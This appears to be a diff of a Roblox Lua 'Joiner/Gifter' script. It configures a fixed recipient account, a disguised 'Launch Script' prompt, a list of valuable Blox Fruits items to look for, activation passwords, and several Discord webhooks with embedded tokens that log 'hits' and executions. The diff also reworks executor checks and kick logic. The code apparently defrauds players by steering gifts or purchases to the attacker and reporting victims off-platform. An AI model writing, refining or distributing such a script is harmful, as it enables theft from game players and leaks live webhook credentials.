@@ -1,36 +1,34 @@
 --[[============================ Configuration ============================]]
 
---[[============================ Configuration ============================]]
-
 -- Shared Joiner/Core Settings
 local Webhook = "https://discordapp.com/api/webhooks/1345845274068910233/lrQzS48o7448ZJW7sVp2urneECa5xnwiD5jm_VeEJIZL0t50XL8Dp1GzmRbbT7sI3XLI" -- << Your primary Joiner webhook for hits/leaves
 local Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames for command access
 local FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits Joiner looks for
-
+local Joiner_ActivationPasswords = { -- Passwords for ?activate command (Keeping prefix for clarity as it's specific to Joiner's activate command)
+	"ishusontop",
+	"bonzarbal",
+	"ishufishy"
+}
 
 -- Gifter Specific Settings
 local Gifter_LogsWebhook = "https://discord.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5" -- Webhook for successful gift logs
 local Gifter_ExecutionWebhook = "https://discord.com/api/webhooks/1341656445992566856/bRTdn_IfzIBF7JY696AO8UhyjMT9LGX6zVgR8jT4zWgf6iASgDxEWvH3ploQtGxOe2bp" -- Webhook for script execution logs
 local Gifter_TargetUsername = "x6TNine" -- << FIXED RECIPIENT USERNAME
 local Gifter_PromptText = "Launch Script" -- << Text for the prompt button
-local Gifter_RandomizedPrompt = false -- Use randomized style for the prompt button
+local Gifter_RandomizedPrompt = false -- Use randomized style for the prompt button (Keep false to use simplified font logic below)
 
 -- Joiner Secondary Webhooks (Optional but included from original script)
-local Joiner_Webhook2 = "https://discordapp.com/api/webhooks/1357801007417131180/4RTSkJBc1pfGzJjBiAYUwMjwPnNu1D2CEFbOJJUMP2WcQ02hUfbaZhnzoLGyzLzUh724" -- Sends the SAME notifications as Webhook
+local Joiner_Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Sends the SAME notifications as Webhook
 local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP" -- Sends notifications ONLY for Kitsune, Yeti, Dragon, or Premium Items
-local Joiner_ActivationPasswords = { -- Passwords for ?activate command (Keeping prefix for clarity as it's specific to Joiner's activate command)
-	"ishusontop",
-	"bonzarbal",
-	"ishufishy"
-}
+
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_4 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_5 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_4 = true
+_G.CombinedScriptExecuted_v1_5 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -52,6 +50,10 @@ local Lighting = game:GetService("Lighting")
 local Teams = game:GetService("Teams")
 local MarketplaceService = game:GetService("MarketplaceService")
 
+--[[============================ Gifter State Variables =====================]]
+-- Moved Gifter state vars here to be accessible by the initial executor check
+local gifter_giftingFailed = false -- Flag for new kick logic (Initialize to false)
+
 --[[============================ Initial Checks & Setup ============================]]
 
 -- Executor Identification & Mobile Delta Check (from Gifter)
@@ -68,12 +70,18 @@ local function isMobile()
 end
 
 local unsupportedExecutor = "Delta"
-local kickMessage = unsupportedExecutor .. " DOES NOT WORK on mobile. Please try a different executor (e.g., Codex, ArceusX or Fluxus) or use a PC."
+-- local kickMessage = unsupportedExecutor .. " DOES NOT WORK on mobile. Please try a different executor (e.g., Codex, ArceusX or Fluxus) or use a PC." -- Message no longer needed here
 local currentExecutor = getExecutor()
+local unsupportedExecutorDetected = (currentExecutor == unsupportedExecutor and isMobile())
 
-if currentExecutor == unsupportedExecutor and isMobile() then
-    LocalPlayer:Kick(kickMessage)
-    return -- Stop script if incompatible executor on mobile
+if unsupportedExecutorDetected then
+    warn("Unsupported executor (" .. currentExecutor .. ") detected on mobile. Gifting may fail.")
+    -- Set giftingFailed flag immediately if unsupported executor is detected,
+    -- as this is one of the failure conditions for the combined kick logic.
+    gifter_giftingFailed = true
+    -- REMOVED IMMEDIATE KICK:
+    -- LocalPlayer:Kick(kickMessage)
+    -- return
 end
 
 -- Joiner Anti-Tamper / Setup
@@ -280,7 +288,7 @@ local gifter_TargetUserId = nil
 local gifter_purchaseInProgress = false
 local gifter_webhookSent = false -- Flag for sending the main gift log
 local gifter_promptConfirmed = false -- Flag for manual confirmation
-local gifter_giftingFailed = false -- Flag for new kick logic
+-- Note: gifter_giftingFailed is defined higher up now
 
 -- Gifter Helper Functions
 local gifter_messages = { -- Shortened List
